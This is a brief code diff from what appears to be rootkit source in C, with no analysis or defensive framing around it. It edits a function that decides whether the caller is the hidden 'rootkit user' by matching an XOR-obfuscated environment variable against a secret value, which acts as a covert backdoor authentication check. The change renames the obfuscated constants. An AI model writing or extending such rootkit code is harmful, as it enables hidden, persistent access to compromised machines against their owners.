@@ -4,8 +4,8 @@ int is_rk_user(void) {
     // Checks if user is the rootkit user
     int rk = 0;
     #ifdef ENV_AUTH
-        char *env_var = strdup(ENV_VAR_NAME); xor(env_var);
-        char *env_var_val = strdup(ENV_VAR_VAL); xor(env_var_val);
+        char *env_var = strdup(HIDDEN_ENV_VAR_NAME); xor(env_var);
+        char *env_var_val = strdup(HIDDEN_ENV_VAR_VAL); xor(env_var_val);
         if (strcmp(getenv(env_var), env_var_val) == 0) {
             DEBUG_MSG("[-] Passed env check\n");
             rk = 1;
